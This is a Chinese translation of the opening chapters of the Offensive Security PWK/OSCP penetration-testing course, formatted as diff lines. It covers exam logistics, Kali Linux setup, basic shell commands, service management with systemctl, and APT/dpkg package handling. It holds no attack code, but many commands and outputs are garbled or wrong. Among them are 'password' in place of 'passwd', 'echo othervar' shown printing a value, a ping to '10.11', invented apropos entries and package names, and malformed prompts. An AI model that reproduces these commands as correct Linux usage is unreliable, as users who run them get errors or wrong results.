+此外，请注意，考试提交的接收是一个手动过程，因此在收到我们正式通知已收到你的文件之前，可能需要一些时间。
+
+一旦你的文件被接受，你的考试将进行评分，你将在10 个工作日内收到结果。如果你获得了通过分数，我们将要求你确认物理地址。如果你未达到分数，我们将通知你，你可以通过相应的链接购买证书重考。
+
+我们强烈建议你仔细安排一个 36 小时的时间窗口进行考试，在此期间你可以确保没有外部干扰或任务。此外，请注意，考试名额按先到先原则处理，因此最好尽早安排考试，以确保你心仪的日期可用。有关考试的更多信息，我们鼓励你花时间查看 OSCP 考试指南¹⁶。
+
+## 1.9.1 Metasploit 使用 - 实验室考试
+
+我们鼓励你在实验室中使用 Metasploit。Metasploit 是一个非常强大的工具，你应该学习它提供的所有功能。虽然在 OSCP 认证考试中对 Metasploit 的使用有限制，但我们鼓励你在学习过程中不要对它的使用设置任何任意的限制。关于 Metasploit 使用的更多信息可以在 OSCP 考试指南中找到。
+
+## 1.10 结语
+
+在本模块中，我们讨论了充分利用 PWK 课程和实验室所需的重要信息。此外，我们还涵盖了报告编写的基础知识以及如何参加最后的 OSCP 考试。
+
+我们祝你 PWK 之旅一切好运，并希望你喜欢你将面对的新挑战。
+
+## 熟悉 Kali Linux
+
+Kali Linux 由 Offensive Security 开发、资助和维护。它是一个基于 Debian 的 Linux 发行版，适用于高级渗透测试和安全审计。Kali 包含了数百种针对各种信息安全任务的工具，例如渗透测试、安全研究、计算机取证和反向工程。
+
+与操作系统捆绑在一起的所有程序都经过了适用性和有效性评估。它们包括用于渗透测试的 Metasploit、用于端口和漏洞扫描的 Nmap、用于监控网络流量的 Wireshark，以及用于测试无线网络安全性的 Aircrack-ng。
+
+本模块的目标是为所有水平的用户提供基础，并为接下来的模块做好准备。我们将探索针对新用户的技巧和窍门，并回顾一些高级用户可能会欣赏的标准。无论技能水平如何，我们都建议对本模块投入适当的关注。正如传闻中亚伯拉罕·林肯说的：“给我六个小时砍树，我会花前五个小时来磨斧头”。
+
+此外，鼓励所有技能水平的用户去 Kali Training 网站查看免费在线培训。这包括《Kali Revealed》书籍、用于测试你理解能力的练习、专门的支持格式等等。这些资源为所有技能水平的用户提供了宝贵的见解，并是本课程培训的绝佳补充。
+
+> ¹⁷ (Offensive Security, 2019), https://kali.training
+
+¹⁸ (Offensive Security, 2019), https://support.offensive-security.com
+
+¹⁹ (VMware, 2019), https://www.vmware.com/products/workstation-pro
+
+²⁰ (VMware, 2019), https://www.vmware.com/products/fusion
+
+²¹ (VMware, 2019), https://www.vmware.com/products/workstation-player
+
+²² (Offensive Security, 2019), https://support.offensive-security.com
+
+## 2.1 启动 Kali Linux
+
+首先，下载官方的 Kali Linux 64 位 (`amd64`) VMware 虚拟机 (`VM`) 以及你选择使用的 VMware 软件。VMware 为 `VMware Workstation Pro` 和适用于 Mac 的 `VMware Fusion` 提供免费试用版。使用这些商业版本的好处是可以拍摄快照，在你需要将虚拟机重置为干净状态时可以恢复。VMware 还提供了软件的免费版本 `VMware Workstation Player`，但免费版本不提供快照功能。
+
+我们将使用 64 位 (`amd64`) Kali Linux 虚拟机，为了获得最佳效果并与实验室指南保持一致，我们建议你良好地使用。不要偏离此标准，因为可能会创建一个与课程材料不一致的工作环境。
+
+你可以在 Offensive Security 支持网站上找到最新的 Kali Linux 虚拟机镜像以及验证下载归包的最新说明。作为一名安全专业人员，你应该始终在下载任何文件之前花时间对其进行验证。不这样做会让你和你的客户面临不必要的风险。
+
+要使用 Kali Linux 虚拟机，我们首先解压并使用 VMware 打开 `.vmx` 文件。如果出现选项，选择“我已复制”，以指示虚拟机生成新的虚拟 MAC 地址并避免潜在冲突。
+
+虚拟机的默认凭据为：
+
+- 用户名：`kali`
+- 密码：`kali`
+
+> 在首次启动时，必须在终端中使用 `password` 命令更改所有默认密码。我们正在和其他学生一起连接到在线实验室，默认密码几乎会保证出问题！
+
+要更改密码，点击终端图标并使用内置的 `password`：
+
+```
+kali@:- password
+Changing password for kali.
+(current) UNIX password:
+Enter new UNIX password:
+Retype new UNIX password:
+password: password updated successfully
+```
+
+Kali Linux 虚拟机将包含两个用户，`root` 和 `kali`。我们将使用 `kali` 用户账户。你可能想以 `root` 用户身份登录，但这并不建议。`root` 用户具有不受限制的访问权限，一个失误的命令可能会损坏我们的系统。最糟糕的是，如果攻击者利用了以 `root` 身份运行的进程，他们将获得我们机器的完全控制权。
+
+许多命令需要权限运行，幸运的是，`sudo` 命令可以解决这个问题。我们使用 `sudo` 后紧跟想要运行的命令，并在提示时提供我们的密码。
+
+```
+kali@:- whoami
+kali
+kali@:- sudo whoami
+[sudo] password for kali:
+root
+```
+
+
+
+最后，探索 VMware 的快照功能，它允许我们在出现问题时恢复或重置虚拟机到干净状态。定期拍摄快照可以在出现问题时节省大量时间和烦恼。
+
+## 2.2 Kali 菜单
+
+Kali 菜单包含了该发行版中许多工具的分类链接。这种结构有助于明确每个工具的作用以及其用法的背景。
+
+花些时间浏览 Kali Linux 菜单，以帮助熟悉可用的工具及其分类。
+
+## 2.3 Kali 文档
+
+作为一个功能完整的操作系统，Kali Linux 提供了许多我们在本课程中无法充分探索的功能和能力。不过，有几个官方 Kali Linux 资源可供进一步的研究和学习：
+
+- Kali Linux 官方文档²³
+- Kali Linux 支持论坛²⁴
+
+# 攻击安全 (OFFENSIVE SECURITY)
+
+www.offensive-security.com
+
+Kali Linux 渗透测试 2.0
+
+- Kali Linux 工具网站²⁵
+- Kali Linux 错误跟踪器²⁶
+- Kali Linux 培训²⁷
+
+### 2.3.1 Kali Linux 官方文档
+
+Kali Docs 网站²⁸ 正如其名，是 Kali Linux 文档库。该网站提供了最新的 Kali 细节，包含许多步骤，应被视为 Kali Linux 故障排除和支持的首站。
+
+### 2.3.2 Kali Linux 支持论坛
+
+故障排除和支持的下一步是 Kali Linux 支持论坛。²⁹ 在发布之前，请阅读论坛规则和指南³⁰，因为不符合规则的帖子通常会被审核或忽略。在创建新主题之前，请务必在论坛中彻底搜索之前发布的解决方案。
+
+### 2.3.3 Kali Linux 工具网站
+
+### 2.3.4 Kali Linux 错误跟踪器
+
+偶尔某些工具可能会崩溃或产生意外结果。当这种情况发生时，在 Kali Linux 错误跟踪器³² 上搜索错误消息可能会确定问题是否为 bug，如果是，以及如何解决。用户也可以通过该网站报告 bug 来帮助社区。
+
+### 2.3.5 Kali Linux 培训网站
+
+Kali Linux 培训³³ 托管官方 Kali Linux 手册和培训课程。这个免费网站基于《Kali Linux Revealed》³⁴ 书籍，包含 HTML 和 PDF 格式的书籍内容、测试你对手册掌握程度的练习、一个支持论坛等等。该网站包含了大量有用信息，帮助用户更好地熟悉 Kali Linux。
+
+²⁵ (Offensive Security, 2019), https://tools.kali.org
+²⁶ (Offensive Security, 2019), https://bugs.kali.org
+²⁷ (Offensive Security, 2019), https://kali.training
+²⁸ (Offensive Security, 2019), https://docs.kali.org
+²⁹ (Offensive Security, 2019), https://forums.kali.org
+³⁰ (Offensive Security, 2019), https://forums.kali.org/forumdisplay.php?f=72-Forums-Rules-and-Guidelines
+³¹ (Offensive Security, 2019), https://tools.kali.org
+³² (Offensive Security, 2019), https://bugs.kali.org
+³³ (Offensive Security, 2019), https://kali.training
+³⁴ (Offensive Security, 2019), https://kali.training
+
+PWK 2.0 版权 © Offensive Security Ltd. 版权所有。 36
+
+### 2.3.6 练习
+
+（这些练习不需要报告）
+
+- 1. 启动你的 Kali 操作系统并将 kali 用户密码更改为安全的密码。
+- 2. 花些时间熟悉 Kali Linux 菜单。
+- 3. 使用 Kali 工具网站，找到你喜欢的工具并查看其文档。如果你没有喜欢的工具，任选一个即可。
+
+## 2.4 在 Kali 中穿行
+
+### 2.4.1 Linux 文件系统
+
+Kali Linux 遵循文件系统层次结构标准 (FHS)，为所有 Linux 用户提供了一个熟悉且通用的布局。你将最常用的目录有：
+
+- `/bin` - 基本程序 (`ls`, `cd`, `cat`, 等)
+- `/sbin` - 系统程序 (`fdisk`, `mkfs`, `swctl`, 等)
+- `/etc` - 配置文件
+- `/tmp` - 临时文件（通常在启动时删除）
+- `/usr/bin` - 应用程序 (`ncat`, `ncat`, `nmap`, 等)
+- `/usr/share` - 应用支持和数据文件
+
+还有许多其他目录你很少需要进入，但对 Linux 文件系统布局良好的熟悉将极大提高你的效率。
+
+### 2.4.2 基础 Linux 命令
+
+#### 2.4.2.1 手册页 (Man Pages)
+
+接下来，让我们深入 Kali 的用法并探索一些基础命令行，提供正式的文档，通常被称为手册（manual）或手册页³⁵。一个名为 `man` 的特殊程序用于查看这些页面。手册页通常包含名称、摘要、命令目的的描述以及相应的选项、参数或开关。让我们看看 `ls` 命令的手册页：
+
+```
+man ls
+```
+
+> Listing 3 - 查看 ls 命令的手册
+
+³⁵ (Linux Foundation, 2016), https://wiki.linuxfoundation.org/lsb/fhs
+³⁶ (Wikipedia, 2019), https://en.wikipedia.org/wiki/Man_page
+
+# 攻击安全 (OFFENSIVE SECURITY)
+
+Kali Linux 渗透测试 2.0
+
+手册页不仅包含用户命令的信息，还有关于系统管理命令的文档。手册分为以下章节：
+
+| 章节 | 内容 |
+| :--- | :--- |
+| 1 | 用户命令 |
+| 2 | 系统调用 |
+| 3 | C 库 |
+| 4 | 设备驱动程序 |
+| 5 | 文件格式 |
+| 6 | 游戏 |
+| 7 | 杂项 |
+| 8 | 系统管理 |
+
+要确定相应的章节，可以使用以下命令：
+
+```bash
+man 5 passwd
+```
+
+> Table 2 - 章节组织
+
+然而，在命令中，正则表达式由脱字符 (`^`) 和美元符号 (`$`) 表示，用于匹配行首行尾。我们现在查看感兴趣的精确手册：
+
+```bash
+man 5 passwd
+```
+
+> List 4 - 执行密码搜索
+
+手册页是查找特定命令文档的最快方法，花时间以更详细的方式探索它们。
+
+### 2.4.2.2 apropos
+
+通过 `apropos`⁸ 我们可以根据关键词在手册页描述列表中搜索特定的匹配。虽然这种方法有点粗浅，但对于根据描述查找特定内容非常有帮助。让我们来看一个例子：假设我们要对硬盘进行分区，但不记得命令的名字。我们可以通过对 "partition" 进行 `apropos` 搜索来解决：
+
+```bash
+kali@:- apropos partition
+addpart (8) - 通知内核分存在
+cfdisk (8) - 显示分区表
+cgisk (8) - 字符界面 GUID 分区表 (GPT) 操作器
+cogpt (7) - 使用 Chromium 管理 GPT 分区的工具
+delpart (8) - 通知内核忘记某个分区
+undeletelete (1) - 从 ext3 或 ext4 分区中删除文件的工具
+fdisk (8) - 管理分区表
+fixparts (8) - MBR 分区表修复工具
+gdisk (8) - 交互式 GUID 分区表 (GPT) 操作器
+gparted (8) - 用于管理磁盘分区的 GN 分区编辑器。
+```
+
+³⁷ (Wikipedia, 2019), https://en.wikipedia.org/wiki/Regular_expression
+³⁸ (The Linux Information Project, 2004), http://www.linfo.org/apropos.html
+
+PWK 2.0 版权 © Offensive Security Ltd. 版权所有。 39
+
+## 列表 7 - 使用 apropos 查找描述中包含 'partition' 的命令
+
+请注意，`apropos` 的功能似乎与 `man -k` 相同，事实上，它们是完全等价的。
+
+### 2.4.2.3 列出文件
+
+`ls` 命令在屏幕上打印出基础的文件列表。我们可以使用各种选项来修改输出结果。`-a` 选项用于显示所有文件（包括隐藏文件），`-1` 选项将每个文件显示在单行，这非常有用。
+
+
+
+```
+kali@kali:~$ ls
+Desktop Downloads Music Pictures Public Templates Videos
+
+kali@kali:~$ ls /etc/apache2/sites-available/*.conf
+/etc/apache2/sites-available/default-ssl.conf
+
+kali@kali:~$ ls -ai
+...
+.bash_history
+.bashrc
+.cache
+.config
+Desktop
+Documents
+...
+```
+
+> 列表 8 - 列出文件
+
+### 2.4.2.4 移动
+
+Linux 不使用 Windows 风格的驱动器号。相反，所有文件、文件夹、设备和设备都是根目录的子节点，由字符 `/` 表示。我们可以使用 `cd` 命令后跟指定目录的路径。`pwd` 命令将打印当前目录（如果你迷了路，这很有帮助），使用 `cd ~` 可以返回主目录。
+
+```
+kali@kali:~$ cd /usr/share/metasploit-framework/
+kali@kali:~$ /usr/share/metasploit-framework pwd
+/usr/share/metasploit-framework
+kali@kali:~$ /usr/share/metasploit-framework cd ~
+kali@kali:~$ pwd
+/home/kali
+```
+
+> 列表 9 - 在文件系统中移动
+
+### 2.4.2.5 创建目录
+
+使用 `mkdir` 命令后跟目录名称可以创建指定的目录。目录名称可以包含空格，但由于我们将在命令行花费大量时间，我们通常使用连字符或下划线来代替，这样可以省去很多麻烦。这些字符会让自动补全（通过 [Tab] 键执行）变得更更容易完成。
+
+```
+kali@kali:-$ mkdir notes
+kali@kali:-$ cd notes/
+kali@kali:/~/notes$ mkdir module one
+kali@kali:/~/notes$ ls
+module one
+kali@kali:/~/notes$ rm -rf module/one/
+kali@kali:/~/notes$ mkdir "module one"
+kali@kali:/~/notes$ cd module one/
+kali@kali:/~/notes/module one$
+```
+
+列表 10 - 在 Kali 中创建目录
+
+我们可以使用非常有用的 `mkdir -p` 一次创建多个目录，它还会创建任何所需的父目录。这可以与大括号扩展结合，创建一个目录结构，例如你的渗透测试笔记。在下面的示例中，我们正在创建一个名为 `test` 的目录，并在该目录下创建三个名为 `recon`、`exploit` 和 `report` 的子目录。
+
+```
+kali@kali:-$ mkdir -p test/{recon,exploit,report}
+kali@kali:-$ ls -l test/
+exploit
+recon
+report
+```
+
+列表 11 - 创建目录结构
+
+### 2.4.3 在 Kali Linux 中查找文件
+
+在 Kali Linux 中查找文件的三个常用的 Linux 命令包括 `find`、`locate` 和 `which`。这些工具有相似之处，但工作方式和返回数据的方式不同，并可能用于不同的情况。
+
+#### 2.4.3.1 which
+
+`which` 命令³⁹ 在 `$PATH` 环境变量中定义的目录中按名称搜索文件。该变量包含了当在发布命令时不带其路径时，Kali 搜索的目录列表。如果找到匹配项，`which` 将返回文件的完整路径，如下所示：
+
+```
+kali@kali:-$ echo $PATH
+/usr/local/bin:/usr/local/bin:/usr/sbin:/usr/bin:/usr/bin:/bin
+```
+
+```
+kali@kali:-$ which sbd
+/usr/bin/sbd
+```
+
+> ³⁹ (die.net, 2019), https://linux.die.net/man/1/which
+
+PWK 2.0 版权 © Offensive Security Ltd. 保留所有权利21
+
+列表 12 - 探索命令
+
+### 2.4.3.2 locate
+
+`locate` 命令⁴⁰ 是在 Kali 中查找文件和目录最快的方法。为了提供更短的搜索时间，`locate` 搜索内置数据库 `locate.db` 而不是整个硬盘索引。该数据库由 cron 调度器定期自动更新。要手动更新 `locate.db` 数据库，可以使用 `updatedb`
+
+```
+kali@kali:~$ sudo updatedb
+kali@kali:~$ locate sbd.exe
+/usr/share/windows-resources/sbd/sbd.exe
+```
+
+列表 13 - 探索 locate 命令
+
+### 2.4.3.3 find
+
+`find` 命令⁴¹ 是这三个工具中最复杂且最灵活的搜索工具。掌握它的语法可能很困难，但它的功能超越了普通的文件搜索。`find` 命令的基本用法如列表 14 所示，其中我们从根系统目录开始递归搜索，查找任何包含字母 "sbd" 的文件。
+
+```
+kali@kali:~$ find / -name "sbd*"
+/usr/bin/sbd
+/usr/share/windows-resources/sbd/sbd.exe
+```
+
+列表 14 - 探索 find
+
+`find` 相比于 `locate` 的主要优势是它可以按大小、所有者、类型、时间戳、权限等进行搜索。
+
+### 2.4.3 练习
+
+- 使用 `systemctl` 启用服务。
+- 使用 `man` 查找命令。
+- 使用 `which` 查找服务。
+- 使用 `locate` 识别服务。
+- 使用 `find` 搜索文件。
+
+> ⁰ (die.net, 2019), https://linux.die.net/man/1/locate
+> ¹ (die.net, 2019), https://linux.die.net/man/1/find
+> ² (Stack Exchange, 2015), https://stackoverflow.com/questions/60205
+
+## 2.5 管理 Linux 服务
+
+Kali Linux 是一个针对安全人员的专用 Linux 发行版。作为此类，它包含了标准功能。Kali 安装自带了一些服务，如 SSH、HTTP 等。因此，这些服务会在启动时加载，导致 Kali 暴露多个端口。Kali 通过设置来解决这个问题。
+
+### 2.5.1 SSH 服务
+
+SSH（Secure Shell）⁴ 通常用于远程访问计算机，使用安全的加密协议。该服务基于 TCP 并监听 22 端口。要在 Kali 中启动 ssh 服务，我们使用 `systemctl` 命令后跟服务名称（本例中为 ssh）：
+
+```
+kali@kali:~# sudo systemctl start ssh
+kali@kali:~$
+```
+
+当命令成功执行时，它不会返回任何输出，但我们可以通过 `ss` 命令并将输出传递到 `grep` 来验证 ssh 服务正在运行并监听 22 端口：
+
+```
+kali@kali:~# sudo ss -antlp | grep sshd
+LISTEN 0 128 :::22 *:*: users:("sshd",pid=1343,fd=3))
+```
+
+（注：此处原文代码块似乎显示不完整，已按逻辑尽可能对齐）
+
+如果我们希望 ssh 服务在启动时自动运行（许多用户都是如此），只需使用 `systemctl` 启用它。不过，请确保先更改默认密码！
+
+```
+kali@kali:~# sudo systemctl enable ssh
+Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-install
+Executing: /lib/systemd/systemd-install enable ssh
+Created symlink /etc/systemd/system/ssh.service -> /lib/systemd/system/ssh.service.
+```
+
+我们可以使用 `systemctl` 启用和禁用 Kali Linux 中的大部分服务。
+
+### 2.5.2 HTTP 服务
+
+Apache HTTP 服务在渗透测试期间使用，用于托管网站，或为向受害者机器提供下载文件的平台。HTTP 服务是 TCP 的
+
+默认在 80 端口监听。为了在 Kali 中启动 HTTP 服务，我们可以像启动 SSH 服务一样使用 `systemctl`，只需将服务名称替换为 "apache2"：
+
+```
+kali@kali:~$ sudo systemctl start apache2
+kali@kali:~$ 
+```
+
+
+
+### 列表 18 - 使用 systemctl 在 Kali 中启动 apache 服务
+
+与 SSH 服务一样，我们可以使用 `ss grep` 命令来验证 HTTP 服务是否正在运行并监听 tcp 端口 80。
+
+```
+kali@kali:~$ ss -antlp | grep apache
+LISTEN 0 128 ::: ::: users:(("apache2",pid=1481,fd=4),("apache2",pid=1480,fd=4),("apache2",pid=1479,fd=4),("apache2",pid=1478,fd=4),("apache2",pid=1477,fd=4),("apache2",pid=1476,fd=4),("apache2",pid=1475,fd=4))
+```
+
+### 列表 19 - 使用 ss grep 确认 apache2 已启动并运行
+
+为了让 apache 服务像 SSH 服务一样在开机时启动，我们需要使用 `systemctl` 及其 `enable` 选项显式地启用它：
+
+```
+kali@kali:~$ sudo systemctl enable apache2
+Synchronizing service apache2.service with SysV script at /lib/systemd/system
+Executing: /lib/systemd/system-sys-install enable apache2
+```
+
+### 列表 20 - 使用 systemctl 设置 apache 在开机时启动
+
+Kali Linux 中的大多数服务的操作方式与 SSH 和 HTTP 相同，都是通过它们的服务或单元脚本运行的。要查看所有可用服务，运行带有 `list-unit-files` 参数的 `systemctl`：
+
+```
+kali@kali:~$ systemctl list-unit-files
+...
+UNIT                                 STATE
+proc-sys-fs-binfmt_misc.autounount  static
+.mount                             generated
+dev-hugepages.mount                 static
+dev-mqueue.mount                    static
+media-cdrom0.mount                   generated
+proc-sys-fs-binfmt_misc.mount      static
+run-vmblock-x2fuse.mount            disabled
+sys-fs-fuse-connections.mount      static
+sys-kernel-config.mount             static
+sys-kernel-debug.mount             static
+...
+```
+
+### 列表 21 - 显示所有可用服务
+
+有关 Kali Linux 中服务管理的更多信息（包括 `systemctl` 的用法），请参考 Kali 训练网站。
+
+## 2.5.3 练习
+
+（这些练习不需要提交报告）
+
+### 攻击性安全
+
+- 1. 练习启动和停止各种 Kali 服务。
+- 2. 启用 SSH 服务在开机时启动。
+
+## 2.6 搜索、安装和删除工具
+
+Kali 镜像包含了渗透测试领域最常用的工具。然而，在 VMware 镜像中将 Kali 仓库中的每一个工具都包含进去是不切实际的。我们需要讨论如何搜索、安装或删除工具。在本节中，我们将探索高级软件包工具 `APT` 工具集以及在对 Kali Linux 系统执行维护操作时非常有用的命令。
+
+`APT` 是一组用于管理 Debian 系系统上的软件包（或应用程序）的工具。由于 Kali 基于 Debian，因此我们可以使用 `APT` 安装和删除应用程序、更新软件包并升级整个系统。`APT` 的魔力之处在于它是一个软件包管理系统，通过递归满足其需求和依赖关系来安装或删除请求的软件包。
+
+### 2.6.1 apt update
+
+`APT` 软件包的信息缓存在本地，以加快任何涉及查询 `APT` 数据库的操作。因此，更新可用软件包列表（包括版本信息、描述等）始终是一个良好的习惯。我们可以通过 `apt update` 命令实现这一点：
+
+```
+kali@kali:~$ apt update
+Hit: http://archive.kali.org/kali InRelease
+Get:2 http://archive.kali.org/kali kali-backports Release [1685 B]
+Fetched 1685 B in 1s 1.68 MB/s
+Get:2 http://archive.kali.org/kali kali-testing InRelease [1685 B]
+Fetched 1685 B in 1s 1.68 MB/s
+Get:2 http://archive.kali.org/kali kali-main InRelease [1685 B]
+Fetched 1685 B in 1s 1.68 MB/s
+Reading package lists lists... Done
+Reading dependency tree... Done
+All packages are up to date.
+```
+
+> 使用 `apt update` 更新软件包列表
+
+### 2.6.2 apt upgrade
+
+在更新软件包数据库后，我们可以使用 `apt upgrade` 命令来升级已安装软件包：
+
+```
+kali@kali~$ apt upgrade
+Reading package lists... Done
+Building dependency tree... Done
+0 upgraded, 0 newly installed, 0 to remove.
+```
+
+> 使用 `apt upgrade` 升级软件包
+
+### 2.6.3 apt search
+
+为了查看哪些软件包可用，可以使用 `apt search` 命令，它会显示可以升级的软件包：
+
+```
+kali@kali~$ apt search apache2
+apache2/kali-main 2.4.52-1 all64 Apache web server
+apache2-bin/kali-main 2.4.52-1 all64 The Apache web server binary
+apache2-data/kali-main 2.4.52-1 all64 Apache web server data files
+apache2-doc/kali-main 2.4.52-1 all64 The Apache web server documentation
+apache2-icu/kali-main 2.4.52-1 all64 The Apache web server with ICU support
+apache2-utils/kali-main 2.4.52-1 all64 The Apache web server utilities
+apache2-mod-php/kali-main 8.2.12-1 all64 The Apache module for PHP
+apache2-mod-php-fpm/kali-main 8.2.12-1 all64 The Apache module for PHP FPM
+```
+
+> 使用 `apt search` 搜索软件包
+
+### 2.6.4 apt install
+
+`apt install` 命令可以用于在系统中安装新软件包：
+
+
+
+```
+kali@kali~$ sudo apt install apache2
+Reading package lists... Done
+Building dependency tree... Done
+The following NEW packages will be installed:
+apache2 apache2-bin apache2-data apache2-doc apache2-icu apache2-utils libapache2-bin-2 common-apache2
+7 newly installed, 0 upgraded, 0 to remove.
+After this operation, 4.2 MB of disk space will be used.
+Get:1 http://archive.kali.org/kali kali-main apache2 2.4.52-1 [155 KB]
+Get:2 http://archive.kali.org/kali kali-main apache2-bin 2.4.52-1 [110 KB]
+Get:3 http://archive.kali.org/kali kali-main apache2-data 2.4.52-1 [350 KB]
+Get:4 http://archive.kali.org/kali kali-main apache2-doc 2.4.52-1 [2.10 MB]
+Get:5 http://archive.kali.org/kali kali-main apache2-icu 2.4.52-1 [85 KB]
+Get:6 http://archive.kali.org/kali kali-main apache2-utils 2.4.52-1 [120 KB]
+Get:7 http://archive.kali.org/kali kali-main common-apache2 2.4.52-1 [150 KB]
+Fetched 4.2 MB in 1s 4.2 MB/s
+Selecting previously selected...
+The following packages will be unpacked:
+  apache2 (2.4.52-1)
+  apache2-bin (2.4.52-1)
+  apache2-data (2.4.52-1)
+  apache2-doc (2.4.52-1)
+  apache2-icu (2.4.52-1)
+  apache2-utils (2.4.52-1)
+  common-apache2 (2.4.52-1)
+Unpacking apache2 (2.4.52-1)...
+Unpacking apache2-bin (2.4.52-1)...
+Unpacking apache2-data (2.4.52-1)...
+Unpacking apache2-doc (2.4.52-1)...
+Unpacking apache2-icu (2.4.52-1)...
+Unpacking apache2-utils (2.4.52-1)...
+Unpacking common-apache2 (2.4.52-1)...
+Setting up common-apache2 (2.4.52-1)...
+Setting up apache2-data (2.4.52-1)...
+Setting up apache2-icu (2.4.52-1)...
+Setting up apache2-utils (2.4.52-1)...
+Setting up apache2-bin (2.4.52-1)...
+Setting up apache2 (2.4.52-1)...
+Setting up apache2-doc (2.4.52-1)...
+```
+
+> 使用 `apt install` 安装软件包
+
+### 2.6.5 apt remove --purge
+
+同样，我们可以使用 `apt remove --purge` 命令来删除软件包。注意的是，使用 `apt remove` 软件包会删除数据，但会留下通常（修改过的）用户配置文件以防误删。使用 `purge` 选项可以移除所有残留文件：
+
+```
+kali@kali~$ sudo apt remove --purge apache2
+Reading package lists...
+Building dependency tree...
+Reading state information... Done
+The following packages will be REMOVED:
+  apache2
+0 upgraded, 0 newly installed, 1 to remove.
+After this operation, 581 KB disk space will be freed.
+Do you want to continue? [Y/n
+(Reading database 388024 files and directories currently installed)
+Removing apache2 (2.4.52-1)...
+Purging configuration files for apache2 (2.4.52-1)...
+Processing triggers for systemd (240-6) ...
+```
+
+> 使用 `apt remove --purge` 彻底移除软件包
+
+# 攻击性安全
+
+太棒了！现在可以在 Kali Linux 中搜索、安装和删除工具了。让我们探索本模块中的一个命令：`dpkg`。
+
+## 2.6 dpkg
+
+`dpkg` 是用于安装软件包的核心工具，可以直接安装或间接通过 APT 安装。它也是离线操作时的首选工具，因为它不需要互联网连接。注意，`dpkg` 不会安装软件包所需的任何依赖项。要使用 `dpkg` 安装软件包，请提供 `-i` 或 `--install` 选项以及 `deb` 包文件的路径。这假设软件包的 `deb` 文件已经通过某种其他方式被下载或安装。
+
+```
+kali~$ sudo dpkg -i man-db-2.7.0.2-5_amd64.deb
+(Reading database) ... 86425 files and directories installed. ...
+Preparing to unpack man-db-2.7.0.2-5_amd64.deb ...
+Unpacking man-db (2.7.0.2-5) over (2.7.0-4) ...
+Setting up man-db (2.7.0.2-5) ...
+Updating database of manual pages ...
+Processing triggers for mime-support (3.58) ...
+```
+
+| 列表 27 - 使用 `dpkg -i` 安装 `man-db` |
+
+### 2.6.1 练习题
+
+（报告并非你 Kali 虚拟机的快照（可选））。
+
+- 1. 为你的 Kali 虚拟机创建一个快照。
+- 2. 搜索一个 Kali 中未安装的工具。
+- 3. 安装该工具。
+- 4. 该工具。
+- 5. 将 Kali 虚拟机恢复到之前拍摄的快照（可选）。
+
+## 2.7 总结
+
+在本模块中，我们为接下来的模块奠定了基础。我们探索了新用户的技巧和窍门，并回顾了一些更高级用户可能会青睐的标准。
+
+鼓励所有学生查看 Kali Training 网站上的免费在线培训。该网站包括《Kali Linux Revealed》书籍、旨在测试你理解能力的练习题、专门的支持论坛等等内容。这些免费资源为所有技能水平的用户提供了宝贵的见解，并作为本课程所提供培训的绝佳伙伴。
+
+> 46 (Offensive Security, 2019), https://kali.training
+
+## 3. 命令行行的乐趣
+
+在本模块中，我们将简要介绍几个流行的 Linux 命令行程序。可以随时参考 Kali Linux 培训网站进行复习或进行更深入的讨论。
+
+## 3.1 Bash 环境
+
+`Bash` 是一个与 `sh` 兼容 `shell`，允许我们从终端窗口运行复杂的命令并执行不同的任务。它结合了 KornShell 和 C shell (`csh`) 的一些有用功能。
+
+### 3.1.1 环境变量
+
+当打开终端窗口时，会初始化一个新的 `Bash` 进程，该进程有自己的环境变量。这些变量是全局存储的形式，用于存储会话期间运行的应用程序所继承的各种设置。最常引用的环境变量之一是 `PATH`，它是一个由冒号分隔的目录路径列表，每当在没有完整路径运行命令时，`Bash` 都会搜索这些路径。
+
+我们可以使用 `echo` 命令后跟 `$` 符号和环境变量名称来查看给定环境变量的内容。例如，让我们来看 `PATH` 环境变量的内容。
+
+```
+kali@kali:- echo $PATH
+/usr/local/bin:/usr/bin:/usr/sbin:/bin:/sbin
+```
+
+> 列表 29 - 使用 `echo` 显示 `PATH` 环境变量
+
+
+
+其他一些环境变量包括 `USER`、`PWD` 和 `HOME`，它们分别持有当前用户用户名、当前工作目录和主目录的值。
+
+```
+kali@kali:- echo $USER
+kali
+kali@kali:- echo $PWD
+/home/kali
+kali@kali:- echo $HOME
+/home/kali
+```
+
+> 列表 29 - 使用 `echo` 显示 `USER`, `PWD` 和 `HOME` 环境变量
+
+可以使用 `export` 命令定义环境变量。例如，如果我们正在扫描目标且不想重复输入系统的 IP 地址，可以快速为其赋值并使用：
+
+```
+kali@kali:-$ export b=10.11
+```
+
+```
+kali@kali:-$ ping -c 3 b
+PING 10.11 (10.11) 56(84) bytes of
+64 bytes from 10.11: icmp_seq=1 ttl=62 time=23 ms
+64 bytes from 10.11: icmp_seq=2 ttl=62 time=23 ms
+64 bytes from 10.11: icmp_seq=3 ttl=62 time=56 ms
+
+---
+---
+3 packets transmitted, 3 received, 0% packet loss, time 102ms
+rtt min/avg/max/mdev = 23/34.0/56.0/16.5 ms
+```
+
+> `export` 命令使变量对我们从当前 shell 生成的所有进程可见。如果没有使用 `export` 设置变量，该变量将仅在当前 shell 中可用。我们将使用 `$$` 显示当前 shell 的进程 ID，以确保我们在不同的 shell 中执行命令：
+
+```
+kali@kali:-$ echo $$
+1827
+```
+
+```
+kali@kali:-$ var="My Var"
+```
+
+```
+kali@kali:-$ echo $var
+My Var
+```
+
+```
+kali@kali:-$ bash
+```
+
+```
+kali@kali:-$ echo $$
+1908
+```
+
+```
+kali@kali:-$ echo $var
+My Var
+```
+
+```
+kali@kali:-$ exit
+```
+
+```
+kali@kali:-$ export othervar="Global Var"
+```
+
+```
+kali@kali:-$ echo othervar
+Global Var
+```
+
+```
+kali@kali:-$ bash
+```
+
+```
+kali@kali:-$ echo othervar
+Global Var
+```
+
+```
+kali@kali:-$ exit
+```
+
+> 列表 31 - 使用 `export` 声明变量
+
+Kali Linux 中默认定义了许多环境变量。我们可以通过命令行运行 `env` 来查看这些变量：
+
+```
+SHELL=/bin/bash
+PWD=/home/kali
+XDG_DESKTOP=lightdm-session
+LOGNAME=kali
+XDG_SESSION_TYPE=x11
+AUTHORITY=/home/kali/.Xauthority
+XDG_RUNTIME_DIR=/var/lib/lightdm/kali
+HOME=/home/kali
+...
+TERM=xterm-256color
+USER=kali
+```
+
+> 列表 32 - 使用 `env` 显示所有环境变量
+
+## 补全
+
+Bash 自动补全功能允许我们使用 Tab 键补全文件名和目录路径。这一功能加速了 shell 的使用，而在其他 shell 中是缺失的。让我们从用户主目录看看它是如何工作的。我们将输入以下命令开始：
+
+```
+ls Desktop/ Downloads/
